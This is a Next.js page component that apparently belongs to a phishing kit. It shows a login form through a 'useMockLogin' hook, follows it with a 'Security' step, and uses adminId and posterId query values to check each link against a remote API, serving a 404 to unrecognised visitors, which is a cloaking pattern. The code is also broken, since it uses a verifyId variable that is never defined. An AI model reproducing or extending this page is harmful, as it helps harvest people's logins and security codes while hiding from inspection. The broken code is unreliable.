import { motion } from "framer-motion";
import { useState } from "react";
import { API_URL, site } from "../../../../config/index";
import useMockLogin from "../../../../hooks/useMockLogin";
import Header from "../../../../components/Header";
import Login from "../../../../components/Login";
import Footer from "../../../../components/Footer";
import Security from "../../../../components/Security";


export default function Home() {
  const [showModal, setShowModal] = useState(false);

  const { login } = useMockLogin({ setShowModal });

  return (
    <>
      {!showModal && (
        <>
          <Header />
          <Login login={login} />
          <Footer />
        </>
      )}

      {showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
        >
          <Security setShowModal={setShowModal} />
        </motion.div>
      )}
    </>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${verifyId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  console.log("data", data);

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
